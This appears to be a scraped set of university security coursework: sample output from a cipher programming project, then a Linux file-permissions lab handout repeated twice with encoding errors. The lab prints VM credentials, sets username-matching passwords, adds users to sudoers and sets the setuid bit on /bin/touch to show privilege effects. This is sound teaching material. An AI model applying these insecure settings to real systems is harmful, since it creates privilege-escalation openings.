RMIY PRZS AZTQ TDCM XGYG LUMR SCFV HGKG PBWU ZUMR PVSO TAIK RWLR LOMT WYSY TRWL CMZX PVVG AGFF RBVD HIPK ZFUE JKSC JOFE DVXG VQBH ABHS TGXZ OKCG ZVAS WROW QANS TEYG CSCE 3550 Foundations of Cybersecurity Spring 2022 11 BNUO NBWY LRIW NPRY QSQS OISO YATZ DTUX MAWN WPSL HTNZ VBRR IESW DOHL UXLF BMWU ZFWI PVOO FXNS TAJK MZMD PCVP WIYW IEZZ PNTI PHZP XCLW VSFL BUMH EBUP XIYA XPJN MPWU HRVP FDEG RAYK PNLB QFGE TBVF OPVL ZRVC DKWY IANK VVUV THVG AROE GALJ OWEO VGWT DSCA JZRA CSCE 3550 Foundations of Cybersecurity Spring 2022 12 MPFC NEMS DVCH HMCE NBZR TRZT DOBE MUJG AKFA ZFMT DSOT WIRK DVKN MRIR HMAZ WZZF BTZQ MGPE BZOA TRRO VDVZ PRSI OGCQ FIRN ZKYO TYIN ZGVL WBRF YGVZ NBZA CWFW TRVA BPKK MAIS OVSE MQEO VAJU TRUN BSSW NZXS NAYK LVLS POBO NZXL CMIK IGBH ACDP SIZF YWNZ PNBS CSCE 3550 Foundations of Cybersecurity Spring 2022 13 KASE MUEY VEWA TJIS WPCF YFFZ VXGK VYWO GWBR FFKZ ZNCU ERZS WHHS JFIW ZANO BUBH AGAZ PQNA ILZT OBNF PVSX FZUL CMIU WXAR EGWY LRRD GQEM AGIN ZWBR FZUD JWBO VTCN PWZA JFVJ RICY PFII ZAID NZXS HWEM BUMV AUSE FNCW NERY BUIT EHWA WQWW MUVT BBKA QZWQ QANW CSCE 3550 Foundations of Cybersecurity Spring 2022 14 MANG AGPA PWHA AAAA ShiftRows: HZJJ YTOI MDSO KFUU CMNU YLBC HSQM GJRC RMIY RZSP TQAZ MTDC XGYG UMRL FVSC GHGK PBWU UMRZ SOPV KTAI RWLR OMTL SYWY LTRW CMZX VVGP FFAG DRBV HIPK FUEZ SCJK EJOF DVXG QBHV HSAB ZTGX OKCG VASZ OWWR SQAN TEYG NUOB WYNB WLRI NPRY SQSQ CSCE 3550 Foundations of Cybersecurity Spring 2022 15 SOOI ZYAT DTUX AWNM SLWP ZHTN VBRR ESWI HLDO FUXL BMWU FWIZ OOPV SFXN TAJK ZMDM VPPC WWIY IEZZ NTIP ZPPH WXCL VSFL UMHB UPEB AXIY XPJN PWUM VPHR GFDE RAYK NLBP GEQF FTBV OPVL RVCZ WYDK KIAN VVUV HVGT OEAR JGAL OWEO GWTV CADS AJZR MPFC EMSN CHDV EHMC CSCE 3550 Foundations of Cybersecurity Spring 2022 16 NBZR RZTT BEDO GMUJ AKFA FMTZ OTDS KWIR DVKN RIRM AZHM FWZZ BTZQ GPEM OABZ OTRR VDVZ RSIP CQOG NFIR ZKYO YINT VLZG FWBR YGVZ BZAN FWCW ATRV BPKK AISM SEOV OMQE VAJU RUNT SWBS SNZX NAYK VLSL BOPO LNZX CMIK GBHI DPAC FSIZ YWNZ NBSP SEKA YMUE VEWA JIST CFWP CSCE 3550 Foundations of Cybersecurity Spring 2022 17 ZYFF VXGK YWOV BRGW ZFFK ZNCU RZSE HSWH WJFI ZANO UBHB AZAG APQN ILZT BNFO SXPV LFZU CMIU XARW WYEG DLRR GQEM GINA BRZW DFZU JWBO TCNV ZAPW JJFV RICY FIIP IDZA SNZX HWEM UMVB SEAU WFNC NERY UITB WAEH WWQW MUVT BKAB WQQZ WQAN MANG GPAA HAPW AAAA Parity Bit: CSCE 3550 Foundations of Cybersecurity Spring 2022 18 48 5a ca ca 59 d4 cf c9 4d 44 53 cf 4b c6 55 55 c3 4d 4e 55 59 cc 42 c3 48 53 d1 4d 47 ca d2 c3 d2 4d c9 59 d2 5a 53 50 d4 d1 41 5a 4d d4 44 c3 d8 47 59 47 55 4d d2 cc c6 56 53 c3 47 48 47 4b 50 42 d7 55 55 4d d2 5a 53 cf 50 56 4b d4 41 c9 d2 d7 cc d2 cf 4d d4 cc 53 59 d7 59 cc d4 d2 d7 c3 4d 5a d8 56 56 47 50 c6 c6 41 47 44 d2 42 56 48 c9 50 4b c6 55 c5 5a 53 c3 ca 4b c5 ca cf c6 44 56 d8 47 d1 42 48 56 48 53 41 42 5a d4 47 d8 cf 4b c3 47 56 41 53 5a cf d7 d7 d2 53 d1 41 4e d4 c5 59 47 4e 55 cf 42 d7 59 4e 42 d7 cc d2 c9 4e 50 d2 59 53 d1 53 d1 53 cf cf c9 5a 59 41 d4 44 d4 55 d8 41 d7 4e 4d 53 cc d7 50 5a 48 d4 4e 56 42 d2 d2 c5 53 d7 c9 48 cc 44 cf c6 55 d8 cc 42 4d d7 55 c6 d7 c9 5a cf cf 50 56 53 c6 d8 4e d4 41 ca 4b 5a 4d 44 4d 56 50 50 c3 CSCE 3550 Foundations of Cybersecurity Spring 2022 19 d7 d7 c9 59 c9 c5 5a 5a 4e d4 c9 50 5a 50 50 48 d7 d8 c3 cc 56 53 c6 cc 55 4d 48 42 55 50 c5 42 41 d8 c9 59 d8 50 ca 4e 50 d7 55 4d 56 50 48 d2 47 c6 44 c5 d2 41 59 4b 4e cc 42 50 47 c5 d1 c6 c6 d4 42 56 cf 50 56 cc d2 56 c3 5a d7 59 44 4b 4b c9 41 4e 56 56 55 56 48 56 47 d4 cf c5 41 d2 ca 47 41 cc cf d7 c5 cf 47 d7 d4 56 c3 41 44 53 41 ca 5a d2 4d 50 c6 c3 c5 4d 53 4e c3 48 44 56 c5 48 4d c3 4e 42 5a d2 d2 5a d4 d4 42 c5 44 cf 47 4d 55 ca 41 4b c6 41 c6 4d d4 5a cf d4 44 53 4b d7 c9 d2 44 56 4b 4e d2 c9 d2 4d 41 5a 48 4d c6 d7 5a 5a 42 d4 5a d1 47 50 c5 4d cf 41 42 5a cf d4 d2 d2 56 44 56 5a d2 53 c9 50 c3 d1 cf 47 4e c6 c9 d2 5a 4b 59 cf 59 c9 4e d4 56 cc 5a 47 c6 d7 42 d2 59 47 56 5a 42 5a 41 4e c6 d7 c3 d7 41 d4 d2 56 42 50 4b 4b 41 c9 53 4d CSCE 3550 Foundations of Cybersecurity Spring 2022 20 53 c5 cf 56 cf 4d d1 c5 56 41 ca 55 d2 55 4e d4 53 d7 42 53 53 4e 5a d8 4e 41 59 4b 56 cc 53 cc 42 cf 50 cf cc 4e 5a d8 c3 4d c9 4b 47 42 48 c9 44 50 41 c3 c6 53 c9 5a 59 d7 4e 5a 4e 42 53 50 53 c5 4b 41 59 4d 55 c5 56 c5 d7 41 ca c9 53 d4 c3 c6 d7 50 5a 59 c6 c6 56 d8 47 4b 59 d7 cf 56 42 d2 47 d7 5a c6 c6 4b 5a 4e c3 55 d2 5a 53 c5 48 53 d7 48 d7 ca c6 c9 5a 41 4e cf 55 42 48 42 41 5a 41 47 41 50 d1 4e c9 cc 5a d4 42 4e c6 cf 53 d8 50 56 cc c6 5a 55 c3 4d c9 55 d8 41 d2 d7 d7 59 c5 47 44 cc d2 d2 47 d1 c5 4d 47 c9 4e 41 42 d2 5a d7 44 c6 5a 55 ca d7 42 cf d4 c3 4e 56 5a 41 50 d7 ca ca c6 56 d2 c9 c3 59 c6 c9 c9 50 c9 44 5a 41 53 4e 5a d8 48 d7 c5 4d 55 4d 56 42 53 c5 41 55 d7 c6 4e c3 4e c5 d2 59 55 c9 d4 42 d7 41 c5 48 d7 d7 d1 d7 4d 55 56 d4 CSCE 3550 Foundations of Cybersecurity Spring 2022 21 42 4b 41 42 d7 d1 d1 5a d7 d1 41 4e 4d 41 4e 47 47 50 41 41 48 41 50 d7 41 41 41 41 MixColumns: 7d 51 c3 55 66 e3 ef 5c 56 57 5c 79 5a e9 73 e9 79 4c 59 7a ee f1 70 dc c3 62 d8 52 c1 c7 fe ec 4b 71 79 db 47 45 e8 d4 64 c9 d4 e3 f1 ef da 7c d5 47 cb 49 64 6f 54 d1 d3 7e e4 cb 6e 42 e4 50 47 48 c9 db 44 46 d9 d2 7e ed 66 e3 60 f7 62 7a 6a ef e1 7e 6e 72 cf 6d f4 4f c0 ce 72 c5 f3 4d e5 74 7e 4a 7a 62 55 e7 ce e1 59 fc 46 f8 6c c8 57 7f f1 f5 ef f7 4b e4 7c 44 50 d6 dc 59 7a 5b f2 ed 75 ee 7f f3 cc f5 eb d5 db e6 e1 58 f4 76 e3 53 fe fc 7a 7a 46 d0 e9 d7 e6 70 75 f2 58 dd 61 fb 64 c3 fd 48 dc cc 4d 6d 67 c1 4b db d5 40 60 5e c4 c7 47 fa 7f 74 55 ef c7 66 66 5c 73 40 42 55 7b 62 69 66 7f fc 4d 58 c9 e7 6a ec d5 f2 76 e8 41 fc d9 fe 73 dd CSCE 3550 Foundations of Cybersecurity Spring 2022 22 52 6d fe d1 e0 f3 55 e8 49 f1 7d 5c cc 74 76 55 f4 4e cd 71 69 58 50 6f dc d2 da db 4d fc 7b d6 40 ce 6e 70 de 6b d8 e1 d6 7e 67 c0 6c 5e e0 ee 51 c2 6d d5 e1 7b ea 75 47 f9 43 5e 42 e1 cb d7 6a cd 5f e1 78 43 55 fd 4a 54 7c 5c c5 d3 fc 7c ed 76 c3 e8 fb e0 d0 dc ec dc e7 f6 41 42 f7 ec 43 7b 64 76 f3 79 fc e7 74 ca f7 68 59 de 46 eb 75 f4 de d2 d9 76 ff c2 71 d4 63 d5 46 e9 59 44 de 58 53 72 f2 e7 7b 7f ce 5c e8 fe 5e 6b e0 44 d6 c7 77 52 4c 7b 70 f0 c8 77 6b da 47 5a e1 66 41 55 ca 7f 40 65 dc db f4 e2 c2 dd 70 ef 70 e1 d1 5e f9 c6 cc c3 d4 f9 57 42 7d ed d7 61 70 d2 df d7 da d0 5c f1 48 75 62 61 e9 5c fe e6 76 59 45 49 e7 77 c8 dc f3 66 4d d6 70 e6 49 63 df 77 ca 61 76 45 cb c5 d6 c0 4c 6a ea d1 f9 4c 5c e1 cb ff 5a e9 77 d9 75 46 cf cd 78 77 CSCE 3550 Foundations of Cybersecurity Spring 2022 23 d4 5a 69 67 fe 63 65 f8 76 6d 7b 66 f3 63 7e e7 cd 45 58 f2 4f cf e7 5b ed f7 c7 db db 68 7d d2 fa c0 76 ee ef df f5 fe 51 66 f8 57 c1 e4 45 46 4f c7 ca cb d7 73 ee 54 dd dd fd d3 e8 4c 4d ce e8 c6 55 5a d3 da 44 71 45 5c 5c 75 d6 5f d9 4f 47 6a 53 c6 5d 5a 43 f1 ca 63 c0 63 6a fb 77 c0 69 4a 60 fc 5a d3 74 dc 44 7f 60 6e 70 4e 51 73 dd 44 d5 c4 ef 70 60 64 47 e9 71 d0 5f dd 45 f0 78 c6 cd ce 65 e1 57 75 55 e1 d6 ca 46 eb 79 7f ea c5 c1 d5 7a f7 74 40 c1 54 4d fb 4b 4e d4 4a 72 7b cc cc 4e 47 ec d1 78 7b 62 d3 d0 4f ef fa 74 e5 67 fe 62 78 d2 48 d2 4e cc 54 7d cc f3 5d 4e e8 f0 fb 62 f1 e7 61 d9 4c e8 d0 41 ed 43 db 4b f3 ed f8 48 f6 d1 46 44 e4 f4 eb 78 60 c0 fe 5d 43 e8 57 ef d3 fd d6 44 6f 4f 67 74 c3 dd db 56 c2 fe e2 68 5a 50 f8 c4 51 79 51 CSCE 3550 Foundations of Cybersecurity Spring 2022 24 eb 61 64 ca c0 df e4 f5 d9 5a c3 fb 6b 7d df 5d 63 47 cc eb 51 58 e4 d2 cc ec ff e9 e5 69 c5 54 5c 77 ff 61 7c 7a fd f0 d8 cf 6d f0 f7 dc e8 e3 5a 72 4e db 5a 63 7d e6 59 50 6c 70 5a 50 41 dd $ more output2.txt Preprocessingubstitution: HZJJIYTOSOMDFUUKCMNUCYLBQMHSJRCGRMIYPRZSAZTQTDCMXGYGLUMRSCFVHGKGPBWUZUMRPVSOTAI KRWLRLOMTWYSYTRWLCM ZXPVVGAGFFRBVDHIPKZFUEJKSCJOFEDVXGVQBHABHSTGXZOKCGZVASWROWQANSTEYGBNUONBWYLRIWN PRYQSQSOISOYATZDTUX MAWNWPSLHTNZVBRRIESWDOHLUXLFBMWUZFWIPVOOFXNSTAJKMZMDPCVPWIYWIEZZPNTIPHZPXCLWVSF LBUMHEBUPXIYAXPJNMP WUHRVPFDEGRAYKPNLBQFGETBVFOPVLZRVCDKWYIANKVVUVTHVGAROEGALJOWEOVGWTDSCAJZRAMPFCN EMSDVCHHMCENBZRTRZT DOBEMUJGAKFAZFMTDSOTWIRKDVKNMRIRHMAZWZZFBTZQMGPEBZOATRROVDVZPRSIOGCQFIRNZKYOTYI NZGVLWBRFYGVZNBZACW FWTRVABPKKMAISOVSEMQEOVAJUTRUNBSSWNZXSNAYKLVLSPOBONZXLCMIKIGBHACDPSIZFYWNZPNBSK ASEMUEYVEWATJISWPCF YFFZVXGKVYWOGWBRFFKZZNCUERZSWHHSJFIWZANOBUBHAGAZPQNAILZTOBNFPVSXFZULCMIUWXAREGW YLRRDGQEMAGINZWBRFZ UDJWBOVTCNPWZAJFVJRICYPFIIZAIDNZXSHWEMBUMVAUSEFNCWNERYBUITEHWAWQWWMUVTBBKAQZWQQ ANWMANGAGPAPWH Padding: HZJJ IYTO SOMD FUUK CMNU CYLB QMHS JRCG CSCE 3550 Foundations of Cybersecurity Spring 2022 25 â€¦ (continued output not shown due to length) 6. Requirements â€¢ Your code should be well documented in terms of comments. For example, good comments in general consist of a header (with your name, course section, date, and a brief description), comments for each variable, and commented â€œblocksâ€ of code. â€¢ Your program will be graded largely on whether it works correctly on the CSE machines (e.g., cse01, cse02, â€¦, cse06), so you should make sure that your program compiles and runs on a CSE machine. â€¢ Please pay attention to the SAMPLE OUTPUT for how this program is expected to work. If you have any questions about this, please contact your instructor or TA assigned to this course to ensure you understand these directions. â€¢ This is an individual programming assignment that must be the sole work of the individual student. Any instance of academic dishonesty will result in a grade of â€œFâ€ for the course, along with a report filed into the Academic Integrity Database. 7. Submission â€¢ You will electronically submit all of your source code files, makefile, if applicable, plus a README file with any important compiling/running instructions for the TA to the Project 3 dropbox in Canvas by the due date. â€¢ Note that the dates on your electronic submission will be used to verify that you met the due date above. Projects submitted late up to 1 day (i.e., 24 hours) will receive a 30% grade penalty. Later submissions will receive zero credit, so hand in your best effort on the due date. â€¢ The work submitted for this project must be your own work and done individually. Evidence to the contrary will receive a â€œ0â€ for this project and may result in further disciplinary action. If you have any questions or concerns about what is expected in this project, please contact your instructor."
INTRO TO COMPUTER SECURITY,5550,File Permissions Linux 1,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux Lab 3a: File Permissions in Linux In this lab, you will be using the Ubuntu 20 VM. The credentials are: Username: sec-lab Password: untccdc NOTE: Address all the questions (Q1, Q2, etc.) marked in bold. When a screenshot is requested, try to fit all the results in one image. If this is not possible, then attach multiple screenshots. When a question is asked, e.g. â€œWho is the owner of the file?â€, type your answer, do not simply provide a screenshot. IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Introduction Unix File Hierarchy The Unix/Linux file system is organized as a hierarchy with the root (/) directory at the highest level. (In this lab, we will use the terms â€œUnixâ€ and â€œLinuxâ€ interchangeably.) Some typical Unix system directories are /usr, /bin, /sbin, /home, /var, /boot, /dev, /etc, and others. In the figure shown below, â€œuser1â€ and â€œuser2â€ are the subdirectories of the directory â€œhomeâ€, â€œhello.txtâ€ is a plain text file and â€œlink_helloâ€ is a link file that points to â€œhello.txtâ€. In order to access the file â€œ/test/temp/hello.txtâ€, the system begins its search from the root (/) directory, then â€œtestâ€ and â€œtempâ€ directories consecutively, and then finally it finds the file â€œhello.txtâ€. Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux Ownership and Permissions Ownership of files in UNIX can be viewed in one of three ways: â€œownerâ€ (creator), â€œgroupâ€ or â€œothersâ€ (i.e., all the other users, apart from the owner and the group members). Using this simple notion of ownership, access to files can be controlled by associating a unique user ID (UID) and a group ID (GID) with twelve permission bits for each file. Typically, these bits are divided into three sets of three bits each, as well as three extra bits as shown in the table below. The values â€œrâ€, â€œwâ€ and â€œxâ€ stand for read, write and execute bits for each of the owner, group and others permissions. The values â€œsuâ€, â€œsgâ€ and â€œtâ€ stand for set_user_id (setuid), set_group_id (setgid) and the sticky bit, respectively. These 4 sets of bits are often represented in their octal digits. For example, â€œ100 111 101 101â€ is represented as â€œ4755â€. When the â€œsuâ€ bit is set, the UID of the process will be that of the owner of the file, no matter who executes the file. Similarly, if the â€œsgâ€ bit is set, the GID of the process will be that of the group. Section 1: Setting up the file structure and the user space The objective of this section is to setup the file hierarchy structure and the user accounts that are required for the following sections. The â€œsuâ€ command is used to switch users. 1. Login as root a. sudo su b. enter password when prompted. c. Now you are root, and the â€˜#â€™ prompt represents the root mode (while the prompt â€˜$â€™ represents the ordinary user mode). 2. Use useradd command to create two new users user1 and user2 as follows: a. useradd user1 -g users b. mkdir /home/user1 c. chown user1:users /home/user1 d. useradd user2 -g users e. mkdir /home/user2 f. chown user2:users /home/user2 3. Use passwd command to set the password for the users you created (required in the case you want to log in). For convenience, set the passwords to be the same as the usernames. You need to retype the passwords and ignore password warnings: a. passwd user1 New password: user1 Retype new password: user1 Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux b. passwd user2 New password: user2 Retype new password: user2 4. Check user information with the id command. Note the uid, gid for each output. a. id user1 b. id user2 Q1: Attach a screenshot of the result. 5. Create a directory structure: a. mkdir /test b. mkdir /test/temp 6. Switch user roles as user1 and then back to root using the su command a. whoami b. sudo su user1 (check â€˜$â€™ indicate user mode) c. sudo su OR sudo su root (Unable to switch to root? You might want to add user1 to the sudoers file.) Note: Adding a user in the sudoers file: 1. Edit â€œ/etc/sudoersâ€ file and add the line described below. 2. Add this line for the users â€œ<username> ALL=(ALL:ALL) ALLâ€ 7. Create a new file as root user a. touch /home/user2/HelloWorld b. ls -l /home/user2/HelloWorld Q2: Who is its owner and what is its group? 8. Change the group ownership as well as the user ownership of the file: a. chgrp users /home/user2/HelloWorld b. chown user2:users /home/user2/HelloWorld c. ls -l /home/user2/HelloWorld Q3: Who is its owner and what is its group? Section 2: Differences in File and Folder Permissions An objective of the following steps is to see the difference between file and folder (directory) permissions. The â€œchmodâ€ command will be used to change the file and directory permissions to demonstrate these differences. 1. Observe the result of ls and cd commands a. cd / b. ls -l Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux c. ls -al /home Q4: Attach a screenshot of the result and answer the following question: What are the directory permissions for the directories user1, user2 and test? d. sudo su user1 e. ls -al /home/user2 Q5: Can you list the directory? f. cd /home/user2 Q6: Can you change the directory? 2. Change the directory permissions of user2 (directory) and try again as user1 (user). a. sudo su root b. chmod 740 /home/user2 c. Repeat steps 1d and 1f as user 1 (user). Q7: Can you list or change the directory? d. sudo su root e. chmod 750 /home/user2 f. Repeat steps 1d and 1f. Q8: Can you list or change the directory? g. touch /home/user2/hello12.txt Q9: Can you create a new file? h. sudo su root i. This time, we will use symbolic options for chmod: chmod g+w /home/user2 j. sudo su user1 k. Repeat step 2g. Q10: Can you create a new file? l. ls -l /home/user2 Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux Section 3: Access control lists Next, let us work with access control lists (ACL). Open a new terminal window and confirm that you are the current user is â€œsec-labâ€. 1. Create a new directory â€œtestâ€: mkdir test make it current: cd test and create a new file file1: touch file1 2. Check a default ACL for this file: getfacl file1 Q11: Attach a screenshot of the result. 3. Set a read and write permission on file file1 for user2: setfacl -m user2:rw file1 4. Confirm that the permissions has been set: getfacl file1 5. Now, user1 should not be able to modify the file: su user1 echo something > file1 exit Q12: Attach a screenshot of the result. 6. At the same time, user 2 is able to do it: su user2 echo something > file1 cat file1 exit Q13: Attach a screenshot of the result. 7. Now, we remove the ACL: setfacl -x user:user2 file1 8. Let us confirmed that the permissions have been revoked: getfacl file1 Q14: Attach a screenshot of the result. Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux Section 4: Text files and link files Unix supports two kinds of link filesâ€”a hard link and a symbolic link. A hard link is a file with the actual address space of some ordinary fileâ€™s data blocks. A symbolic (or soft) link is just a reference to another file. It contains the pathname to some other file. It is basically a shortcut to a file, which is typically used to access it. (Similarly to shortcuts in Windows.) 1. In the /test/temp/ directory, as the root user, create a new text file (â€œhello.txtâ€) and fill it with some text. a. echo something > /test/temp/hello.txt 2. Create a link link_hello in the test folder pointing to hello.txt in the temp folder (refer to the file structure in the introduction of the file hierarchy). a. cd / b. ln -s /test/temp/hello.txt /test/link_hello Q15: Is there any difference in file permissions of link_hello and hello.txt? Explain why. c. cat /test/link_hello Q16: What is the output of the above command? Explain what you see. Section 4: Default file permissions and group access control Whenever a new file is created, a default set of permissions is assigned to it. Whatever the permissions are, Linux allows a user to filter out unwanted permissions set by default. This default setting can be set by the user via the â€œumaskâ€ command. The command takes the permissions set during creation of file and performs a bitwise AND to the bitwise negation of the mask value. Some common umask values are 077 (only user has permissions), 022 (only owner can write), 002 (only owner and group members can write), etc. 1. In a terminal window, make sure you are the root user, otherwise switch back to the root user. 2. Use umask command to check the current mask permission and assign a new mask. a. umask Q17: What is the current mask? How is it interpreted? (try umask â€“S or the man pages) b. cd /test c. touch testmask1 d. ls -al e. Note the permissions of the file â€œtestmask1â€. f. umask 0077 Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux g. touch testmask2 h. Note the permissions of the file â€œtestmask2â€. Q18: What does it mean if the umask value is set to 0000? What is the potential security risk associated with this value of umask? Note: The risks of setting the extra bits (i.e., assigning their value to â€œ1â€) will be covered in the next section, which shows that the extra bits should not be set, in general. Section 5: setuid bit, setgid bit and sticky bit As explained in the ownership and permission section, the highest three bits of the permission value of a file represent the setuid bit, setgid bit and the sticky bit. If the setuid (setgid) bit is set on an executable file, then the uid will always be set that of the owner (group) of the file during execution. If the setuid/setgid bit is not set then the uid will be that of the user who executes the process. If the sticky bit is set on a directory, then only an owner of a file in this directory (and in addition the root user, of course) is able to rename or delete the file. In the following exercise, the objective is to demonstrate how processes are affected when the setuid bit is set. Make sure that you begin this exercise with root privileges. a. which touch b. ls â€“l /bin/touch c. chmod 4755 /bin/touch d. ls â€“l /bin/touch e. ls â€“l /home/user2 f. chmod 700 /home/user2 g. ls â€“l /home/user2 (observe timestamp and permissions) h. sudo su user1 i. touch /home/user2/HelloWorld j. ls â€“l /home/user2 (observe timestamp, is it updated?) k. sudo su root l. chmod 0755 /bin/touch m. sudo su user1 n. touch /home/user2/HelloWorld Q19: Provide a screenshot of the result. Explain why the permission is denied, even though it was previously allowed? RESTORE THE SYSTEM Below are the set of commands that you should issue to restore the system to its original form (commands No. 4 and 5 could take some time). 1. sudo su root Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux 2. umask 0022 3. chmod 0755 /bin/touch 4. userdel user1 5. userdel user2 6. rm -rf /home/user1 7. rm -rf /home/user2 8. rm -rf /test 9. rm -rf /home/test/ NOTE: You should type â€œexitâ€ multiple times to come out of the user1 prompt before deleting this user. Q20: Provide screenshot(s) of the result. (Results of all the above commands from 1 to 9 must be shown.)"
INTRO TO COMPUTER SECURITY,5550,File Permissions Linux 2,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux Lab 3a: File Permissions in Linux In this lab, you will be using the Ubuntu 20 VM. The credentials are: Username: sec-lab Password: untccdc NOTE: Address all the questions (Q1, Q2, etc.) marked in bold. When a screenshot is requested, try to fit all the results in one image. If this is not possible, then attach multiple screenshots. When a question is asked, e.g. â€œWho is the owner of the file?â€, type your answer, do not simply provide a screenshot. IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Introduction Unix File Hierarchy The Unix/Linux file system is organized as a hierarchy with the root (/) directory at the highest level. (In this lab, we will use the terms â€œUnixâ€ and â€œLinuxâ€ interchangeably.) Some typical Unix system directories are /usr, /bin, /sbin, /home, /var, /boot, /dev, /etc, and others. In the figure shown below, â€œuser1â€ and â€œuser2â€ are the subdirectories of the directory â€œhomeâ€, â€œhello.txtâ€ is a plain text file and â€œlink_helloâ€ is a link file that points to â€œhello.txtâ€. In order to access the file â€œ/test/temp/hello.txtâ€, the system begins its search from the root (/) directory, then â€œtestâ€ and â€œtempâ€ directories consecutively, and then finally it finds the file â€œhello.txtâ€. Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux Ownership and Permissions Ownership of files in UNIX can be viewed in one of three ways: â€œownerâ€ (creator), â€œgroupâ€ or â€œothersâ€ (i.e., all the other users, apart from the owner and the group members). Using this simple notion of ownership, access to files can be controlled by associating a unique user ID (UID) and a group ID (GID) with twelve permission bits for each file. Typically, these bits are divided into three sets of three bits each, as well as three extra bits as shown in the table below. The values â€œrâ€, â€œwâ€ and â€œxâ€ stand for read, write and execute bits for each of the owner, group and others permissions. The values â€œsuâ€, â€œsgâ€ and â€œtâ€ stand for set_user_id (setuid), set_group_id (setgid) and the sticky bit, respectively. These 4 sets of bits are often represented in their octal digits. For example, â€œ100 111 101 101â€ is represented as â€œ4755â€. When the â€œsuâ€ bit is set, the UID of the process will be that of the owner of the file, no matter who executes the file. Similarly, if the â€œsgâ€ bit is set, the GID of the process will be that of the group. Section 1: Setting up the file structure and the user space The objective of this section is to setup the file hierarchy structure and the user accounts that are required for the following sections. The â€œsuâ€ command is used to switch users. 1. Login as root a. sudo su b. enter password when prompted. c. Now you are root, and the â€˜#â€™ prompt represents the root mode (while the prompt â€˜$â€™ represents the ordinary user mode). 2. Use useradd command to create two new users user1 and user2 as follows: a. useradd user1 -g users b. mkdir /home/user1 c. chown user1:users /home/user1 d. useradd user2 -g users e. mkdir /home/user2 f. chown user2:users /home/user2 3. Use passwd command to set the password for the users you created (required in the case you want to log in). For convenience, set the passwords to be the same as the usernames. You need to retype the passwords and ignore password warnings: a. passwd user1 New password: user1 Retype new password: user1 Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux b. passwd user2 New password: user2 Retype new password: user2 4. Check user information with the id command. Note the uid, gid for each output. a. id user1 b. id user2 Q1: Attach a screenshot of the result. 5. Create a directory structure: a. mkdir /test b. mkdir /test/temp 6. Switch user roles as user1 and then back to root using the su command a. whoami b. sudo su user1 (check â€˜$â€™ indicate user mode) c. sudo su OR sudo su root (Unable to switch to root? You might want to add user1 to the sudoers file.) Note: Adding a user in the sudoers file: 1. Edit â€œ/etc/sudoersâ€ file and add the line described below. 2. Add this line for the users â€œ<username> ALL=(ALL:ALL) ALLâ€ 7. Create a new file as root user a. touch /home/user2/HelloWorld b. ls -l /home/user2/HelloWorld Q2: Who is its owner and what is its group? 8. Change the group ownership as well as the user ownership of the file: a. chgrp users /home/user2/HelloWorld b. chown user2:users /home/user2/HelloWorld c. ls -l /home/user2/HelloWorld Q3: Who is its owner and what is its group? Section 2: Differences in File and Folder Permissions An objective of the following steps is to see the difference between file and folder (directory) permissions. The â€œchmodâ€ command will be used to change the file and directory permissions to demonstrate these differences. 1. Observe the result of ls and cd commands a. cd / b. ls -l Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux c. ls -al /home Q4: Attach a screenshot of the result and answer the following question: What are the directory permissions for the directories user1, user2 and test? d. sudo su user1 e. ls -al /home/user2 Q5: Can you list the directory? f. cd /home/user2 Q6: Can you change the directory? 2. Change the directory permissions of user2 (directory) and try again as user1 (user). a. sudo su root b. chmod 740 /home/user2 c. Repeat steps 1d and 1f as user 1 (user). Q7: Can you list or change the directory? d. sudo su root e. chmod 750 /home/user2 f. Repeat steps 1d and 1f. Q8: Can you list or change the directory? g. touch /home/user2/hello12.txt Q9: Can you create a new file? h. sudo su root i. This time, we will use symbolic options for chmod: chmod g+w /home/user2 j. sudo su user1 k. Repeat step 2g. Q10: Can you create a new file? l. ls -l /home/user2 Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux Section 3: Access control lists Next, let us work with access control lists (ACL). Open a new terminal window and confirm that you are the current user is â€œsec-labâ€. 1. Create a new directory â€œtestâ€: mkdir test make it current: cd test and create a new file file1: touch file1 2. Check a default ACL for this file: getfacl file1 Q11: Attach a screenshot of the result. 3. Set a read and write permission on file file1 for user2: setfacl -m user2:rw file1 4. Confirm that the permissions has been set: getfacl file1 5. Now, user1 should not be able to modify the file: su user1 echo something > file1 exit Q12: Attach a screenshot of the result. 6. At the same time, user 2 is able to do it: su user2 echo something > file1 cat file1 exit Q13: Attach a screenshot of the result. 7. Now, we remove the ACL: setfacl -x user:user2 file1 8. Let us confirmed that the permissions have been revoked: getfacl file1 Q14: Attach a screenshot of the result. Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux Section 4: Text files and link files Unix supports two kinds of link filesâ€”a hard link and a symbolic link. A hard link is a file with the actual address space of some ordinary fileâ€™s data blocks. A symbolic (or soft) link is just a reference to another file. It contains the pathname to some other file. It is basically a shortcut to a file, which is typically used to access it. (Similarly to shortcuts in Windows.) 1. In the /test/temp/ directory, as the root user, create a new text file (â€œhello.txtâ€) and fill it with some text. a. echo something > /test/temp/hello.txt 2. Create a link link_hello in the test folder pointing to hello.txt in the temp folder (refer to the file structure in the introduction of the file hierarchy). a. cd / b. ln -s /test/temp/hello.txt /test/link_hello Q15: Is there any difference in file permissions of link_hello and hello.txt? Explain why. c. cat /test/link_hello Q16: What is the output of the above command? Explain what you see. Section 4: Default file permissions and group access control Whenever a new file is created, a default set of permissions is 